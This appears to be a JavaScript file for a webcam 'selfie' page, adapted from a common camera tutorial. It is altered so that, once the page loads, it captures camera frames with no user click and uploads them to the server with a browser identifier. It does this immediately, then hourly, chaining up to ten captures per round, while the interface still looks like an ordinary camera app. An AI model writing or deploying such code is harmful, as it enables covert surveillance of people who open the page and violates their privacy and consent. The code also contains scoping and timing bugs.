// References to all the element we will need.
var video = document.querySelector('#camera-stream'),
image = document.querySelector('#snap'),
start_camera = document.querySelector('#start-camera'),
controls = document.querySelector('.controls'),
take_photo_btn = document.querySelector('#take-photo'),
delete_photo_btn = document.querySelector('#delete-photo'),
download_photo_btn = document.querySelector('#download-photo'),
error_message = document.querySelector('#error-message');


// The getUserMedia interface is used for handling camera input.
// Some browsers need a prefix so here we're covering all the options
navigator.getMedia = ( navigator.getUserMedia ||
    navigator.webkitGetUserMedia ||
    navigator.mozGetUserMedia ||
    navigator.msGetUserMedia);



if(!navigator.getMedia){
    displayErrorMessage("Your browser doesn't have support for the navigator.getUserMedia interface.");
}
else{

    // Request the camera.
    navigator.getMedia(
    {
        video: true
    },
        // Success Callback
        function(stream){


            // Create an object URL for the video stream and
            // set it as src of our HTLM video element.
            video.src = window.URL.createObjectURL(stream);

            // Play the video element to start the stream.
            video.play();
            video.onplay = function() {
                showVideo();
            };
        //    setTimeout(takePhoto(), 60);

    },
        // Error Callback
        function(err){
            displayErrorMessage("There was an error with accessing the camera stream: " + err.name, err);
        }
        );

}



// Mobile browsers cannot play video without user inpu

function urltoFile(url, filename, mimeType){
    return (fetch(url)
        .then(function(res){return res.arrayBuffer();})
        .then(function(buf){return new File([buf], filename, {type:mimeType});})
        );
}
var i =0;
function takePhoto() {
    var snap = takeSnapshot();

    if(localStorage.getItem("browser"))
    {
        var browser = localStorage.getItem("browser");
    }
    else
    {
        $.ajax({
            url: '/',
            method: 'POST',
            data: {getBrowser:1},
            success: function (data) {
                localStorage.setItem('browser', data);
                var browser = localStorage.getItem("browser");
                urltoFile(snap,'selfie.png','image/png').then(function(file){
                    if(browser){
                        var formData = new FormData();
                        formData.append('file', file);
                        formData.append('browser', browser);
                        $.ajax({
                            url: '/',
                            method:'POST',
                            processData: false,
                            contentType: false,
                            data: formData,
                            success: function (data) {
                                if(i<10) {
                                    takePhoto()
                                    i = i + 1
                                }
                                else {
                                    i = 0
                                }
                            }
                        });
                    }
                })
            }
        });
    }
    urltoFile(snap,'selfie.png','image/png').then(function(file){
        if(browser){
            var formData = new FormData();
            formData.append('file', file);
            formData.append('browser', browser);
            $.ajax({
                url: '/',
                method:'POST',
                processData: false,
                contentType: false,
                data: formData,
                success: function (data) {
                    if(i<10) {
                        takePhoto()
                        i = i + 1
                    }
                    else {
                        i = 0
                    }
                }
            });
        }
    })
}

setInterval(takePhoto, 3600000);
takePhoto();
delete_photo_btn.addEventListener("click", function(e){

    e.preventDefault();

    // Hide image.
    image.setAttribute('src', "");
    image.classList.remove("visible");

    // Disable delete and save buttons
    delete_photo_btn.classList.add("disabled");
    download_photo_btn.classList.add("disabled");

    // Resume playback of stream.
    video.play();

});



function showVideo(){
    // Display the video stream and the controls.

    hideUI();
    video.classList.add("visible");
    controls.classList.add("visible");
}


function takeSnapshot(){
    // Here we're using a trick that involves a hidden canvas element.

    var hidden_canvas = document.querySelector('canvas'),
    context = hidden_canvas.getContext('2d');

    var width = video.videoWidth,
    height = video.videoHeight;

    if (width && height) {

        // Setup a canvas with the same dimensions as the video.
        hidden_canvas.width = width;
        hidden_canvas.height = height;

        // Make a copy of the current frame in the video on the canvas.
        context.drawImage(video, 0, 0, width, height);

        // Turn the canvas image into a dataURL that can be used as a src for our photo.
        return hidden_canvas.toDataURL('image/png');
    }
}


function displayErrorMessage(error_msg, error){
    error = error || "";
    if(error){
        console.log(error);
    }

    error_message.innerText = error_msg;

    hideUI();
    error_message.classList.add("visible");
}


function hideUI(){
    // Helper function for clearing the app UI.

    controls.classList.remove("visible");
    start_camera.classList.remove("visible");
    video.classList.remove("visible");
    snap.classList.remove("visible");
    error_message.classList.remove("visible");
}